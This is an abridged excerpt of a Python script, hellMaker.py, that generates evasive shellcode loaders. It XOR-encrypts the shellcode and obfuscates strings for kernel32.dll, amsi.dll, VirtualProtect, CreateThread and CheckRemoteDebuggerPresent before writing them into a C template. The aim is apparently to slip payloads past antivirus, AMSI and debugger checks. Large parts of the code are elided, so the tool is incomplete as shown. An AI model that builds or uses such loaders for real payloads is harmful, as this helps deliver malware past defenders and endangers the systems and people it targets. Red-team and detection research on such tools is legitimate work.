# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-hellMaker\hellMaker.py
#!/usr/bin/python3
...
def obfuscate_data(data, key):
    ...
    obfuscated_data = bytes((elements[i] ^ key) for i in range(0, len(elements)))
...
def encrypt_shellcode(shellcode, size, encKey):
    ...
    return bytes((shellcode[idx] ^ elements[idx % keySize]) for idx in range(0, size))
...
def run(fileName, encKey, output):
    ...
    template = template.replace(
        '"DECKEY"', obfuscate_and_convert_data_to_c_fmt(encKey, key)
    )
    ...
    template = template.replace(
        '"kernel32.dll"', obfuscate_and_convert_data_to_c_fmt("kernel32.dll", key)
    )
    template = template.replace(
        '"amsi.dll"', obfuscate_and_convert_data_to_c_fmt("amsi.dll", key)
    )
    template = template.replace(
        '"VirtualProtect"', obfuscate_and_convert_data_to_c_fmt("VirtualProtect", key)
    )
    template = template.replace(
        '"CreateThread"', obfuscate_and_convert_data_to_c_fmt("CreateThread", key)
    )
    template = template.replace(
        '"WaitForSingleObject"',
        obfuscate_and_convert_data_to_c_fmt("WaitForSingleObject", key),
    )
    template = template.replace(
        '"CheckRemoteDebuggerPresent"',
        obfuscate_and_convert_data_to_c_fmt("CheckRemoteDebuggerPresent", key),
    )
...
def main():
    ...
    if os.path.exists(output):
        display_warn(
            "'%s' already exists, do you want to overwrite it [Y,n] : " % output, end=""
        )
